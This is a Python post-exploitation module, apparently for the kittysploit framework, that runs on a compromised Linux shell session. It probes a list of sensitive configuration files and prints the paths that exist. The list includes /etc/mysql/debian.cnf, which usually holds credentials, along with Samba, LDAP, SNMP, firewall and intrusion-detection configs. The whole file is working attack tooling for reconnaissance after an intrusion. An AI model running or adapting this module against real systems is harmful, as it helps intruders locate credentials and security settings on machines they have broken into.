from kittysploit import *

class Module(Post, System):

	__info__ = {
		"name": "Linux Gather Configurations",
		"description": "Linux Gather Configurations",
		"session_type": SessionType.SHELL
	}	
		
	def run(self):

		configs = [
		  "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
		  "/etc/snort/snort.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf",
		  "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
		  "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/security/access.conf",
		  "/etc/gated.conf", "/etc/rpc", "/etc/psad/psad.conf", "/etc/mysql/debian.cnf",
		  "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf",
		  "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/openldap.conf",
		  "/etc/cups/cups.conf", "/etc/opt/lampp/etc/httpd.conf", "/etc/sysctl.conf",
		  "/etc/proxychains.conf", "/etc/cups/snmp.conf", "/etc/mail/sendmail.conf",
		  "/etc/snmp/snmp.conf"
		]

		distro = self.get_sysinfo()['distro']
		print_status(f"Finding configuration files...")
		for config in configs:
			output = self.read_file(config).strip()
			if len(output) == 0:
				continue
			elif "No such file or directory" in output:
				continue
			elif f"cat: {config}:" in output:
				continue
			else:
				print_status(config)
